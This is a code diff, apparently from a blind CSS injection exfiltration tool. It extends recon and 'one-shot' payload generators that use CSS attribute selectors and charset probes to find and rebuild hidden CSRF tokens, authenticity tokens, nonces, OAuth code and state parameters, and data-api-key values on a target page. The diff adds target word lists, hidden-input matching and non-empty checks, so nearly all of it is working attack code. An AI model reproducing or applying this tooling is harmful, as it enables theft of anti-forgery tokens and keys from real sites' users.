@@ -94,17 +94,20 @@
   // Recon kinds, the wordlist each one's names come from, and what a hit means.
   const RECON_KINDS = {
     i: INPUT_NAMES, // input exists
+    iv: INPUT_NAMES, // input value is non-empty (one-shot collision check)
     if: INPUT_NAMES, // ...and its form renders (it's the extraction host)
     ih: INPUT_NAMES, // ...and its value is lowercase hex
     ib: INPUT_NAMES, // ...and its value only has base64 chars
     iw: INPUT_NAMES, // ...and its value only has base64url chars
     m: META_NAMES, // meta exists (and renders, which always works)
+    mv: META_NAMES, // meta content is non-empty
     mh: META_NAMES, // ...and its content is lowercase hex
     mb: META_NAMES, // ...base64
     mw: META_NAMES, // ...base64url
     a: URL_PARAMS, // a link has ?name= or &name=
     f: URL_PARAMS, // a form action has ?name= or &name=
     d: DATA_ATTRS, // an element has the data attribute
+    dv: DATA_ATTRS, // data attribute is non-empty
     ds: DATA_ATTRS, // ...and that element renders (it's the extraction host)
     dh: DATA_ATTRS, // ...and its value is lowercase hex
     db: DATA_ATTRS, // ...base64
@@ -285,6 +288,9 @@
   // --- stage 1: recon ----------------------------------------------------------
 
   const TARGETS = ['input', 'meta', 'url', 'data'];
+  const ONE_SHOT_INPUT_NAMES = ['csrf', 'csrf_token', 'token', 'authenticity_token', 'nonce'];
+  const ONE_SHOT_META_NAMES = ['csrf-token', 'csrf', 'token', 'nonce'];
+  const ONE_SHOT_URL_NAMES = ['token', 'code', 'state', 'key', 'csrf'];
   const ONE_SHOT_DATA_NAMES = ['data-csrf-token', 'data-token', 'data-api-key', 'data-nonce', 'data-key'];
   // The union of supported non-hex alphabets. One probe set covers all whole
   // values; recon selects the narrower alphabet for reconstruction afterward.
@@ -304,19 +310,27 @@
     };
 
     if (targets.has('input')) {
+      const matchInput = name => cfg.nonEmpty
+        ? withTests(inputMatch(name), { attrs: [['type', '=', 'hidden', true]] }) : inputMatch(name);
       INPUT_NAMES.forEach(w => {
-        probe('html', 'html', inputMatch(w), 'i', w);
-        probe('form', 'form', inputMatch(w), 'if', w);
+        const match = matchInput(w);
+        probe('html', 'html', match, 'i', w);
+        probe('form', 'form', match, 'if', w);
+        if (cfg.nonEmpty) probe('html', 'html', withTests(match, {
+          attrs: [['value']], not: [['value', '=', '']],
+        }), 'iv', w);
       });
       // Each long charset test is identical for every name. Factor it into
       // one parent rule; these probes have distinct properties, so moving
       // them together does not change cascade order or the requests.
       for (const [suffix, charset] of CHARSET_PROBES) {
         const only = charsetOnly('value', charset);
-        const group = { tag: 'input', ...only };
+        const group = { tag: 'input', ...only,
+          attrs: cfg.nonEmpty ? [...only.attrs, ['type', '=', 'hidden', true]] : only.attrs };
         INPUT_NAMES.forEach(w => {
-          const test = { attrs: inputMatch(w).attrs };
-          probe('html', 'html', withTests(inputMatch(w), only), 'i' + suffix, w, group, test);
+          const match = matchInput(w);
+          const test = { attrs: match.attrs };
+          probe('html', 'html', withTests(match, only), 'i' + suffix, w, group, test);
         });
       }
       probe('html', 'html', {
@@ -328,6 +342,9 @@
     if (targets.has('meta')) {
       META_NAMES.forEach(w => {
         probe('meta', 'self', metaMatch(w), 'm', w);
+        if (cfg.nonEmpty) probe('meta', 'self', withTests(metaMatch(w), {
+          not: [['content', '=', '']],
+        }), 'mv', w);
       });
       for (const [suffix, charset] of CHARSET_PROBES) {
         const only = charsetOnly('content', charset);
@@ -349,6 +366,9 @@
       DATA_ATTRS.forEach(w => {
         probe('html', 'html', dataMatch(w), 'd', w);
         probe('data', 'self', dataMatch(w), 'ds', w);
+        if (cfg.nonEmpty) probe('html', 'html', withTests(dataMatch(w), {
+          not: [[w, '=', '']],
+        }), 'dv', w);
         // Each attribute's charset probes share the common rejects in one
         // parent rule, nesting only their own (`html:has(&:not(...))`).
         const group = anyCharset(w);
@@ -407,7 +427,7 @@
     if (field.names) {
       const names = field.names;
       switch (field.kind) {
-        case 'input': return { match: { tag: 'input', is: names.map(n => ['name', '=', n, true]) }, attr: 'value', whole };
+        case 'input': return { match: { tag: 'input', attrs: [['type', '=', 'hidden', true]], is: names.map(n => ['name', '=', n, true]) }, attr: 'value', whole };
         case 'meta': return { match: { tag: 'meta', attrs: [['content']], is: names.map(n => ['name', '=', n, true]) }, attr: 'content', whole };
         case 'data': return { match: { is: names.map(n => [n]) }, attr: null, whole };
         case 'a': return { match: { tag: 'a', is: names.map(n => ['href', '*=', n + '=', true]) }, attr: 'href', whole };
@@ -578,18 +598,19 @@
     const add = (kind, names, charset, windowSize, host) => {
       if (names.length) fields.push({ id: firstId + fields.length, kind, names, charset, windowSize, host });
     };
-    if (targets.has('input')) add('input', INPUT_NAMES, 'auto', 3, 'html');
-    if (targets.has('meta')) add('meta', META_NAMES, 'auto', 3, 'self');
+    if (targets.has('input')) add('input', cfg.inputNames || ONE_SHOT_INPUT_NAMES, 'auto', 3, 'html');
+    if (targets.has('meta')) add('meta', cfg.metaNames || ONE_SHOT_META_NAMES, 'auto', 3, 'self');
     if (targets.has('url')) {
-      add('a', URL_PARAMS, urlCharset, urlWindow, 'self');
-      add('form', URL_PARAMS, urlCharset, urlWindow, 'self');
+      const urlKinds = cfg.urlKinds || ['a'];
+      if (urlKinds.includes('a')) add('a', cfg.urlNames || ONE_SHOT_URL_NAMES, urlCharset, urlWindow, 'self');
+      if (urlKinds.includes('form')) add('form', cfg.urlNames || ONE_SHOT_URL_NAMES, urlCharset, urlWindow, 'self');
     }
     if (targets.has('data')) add('data', dataNames, 'auto', 3, 'self');
     return fields;
   }
 
   function oneShotPayload(fields, cfg = {}) {
-    const recon = reconPayload(cfg);
+    const recon = reconPayload({ ...cfg, nonEmpty: true });
     const extract = extractPayload(fields);
     const hosts = new Map();
     for (const host of [...recon.hosts, ...extract.hosts]) {
@@ -597,6 +618,12 @@
       if (!hosts.has(selector)) hosts.set(selector, { ...host, props: [] });
       const props = hosts.get(selector).props;
       for (const prop of host.props) props.push(prop);
+    }
+    const capacity = MAX_LAYERS_PER_BOX * (1 + PSEUDO_BOXES.length);
+    for (const [selector, host] of hosts) {
+      if (host.props.length > capacity) {
+        throw new Error(`one-shot host ${selector} needs ${host.props.length} layers (limit ${capacity}); select fewer targets`);
+      }
     }
     return { rules: [...recon.rules, ...extract.rules], hosts: [...hosts.values()],
       displayMeta: recon.displayMeta || extract.displayMeta };
@@ -606,7 +633,8 @@
 
   const api = {
     INPUT_NAMES, META_NAMES, URL_PARAMS, DATA_ATTRS, RECON_KINDS, FIELD_KINDS, TARGETS,
-    ONE_SHOT_DATA_NAMES, ONE_SHOT_CHARSET, oneShotFields, oneShotPayload, generateOneShotCSS,
+    ONE_SHOT_INPUT_NAMES, ONE_SHOT_META_NAMES, ONE_SHOT_URL_NAMES, ONE_SHOT_DATA_NAMES,
+    ONE_SHOT_CHARSET, oneShotFields, oneShotPayload, generateOneShotCSS,
     renderMatch, render, reconPayload, generateReconCSS, fieldsFromRecon,
     fieldTarget, assignHosts, extractPayload, generateBlindCSS,
   };
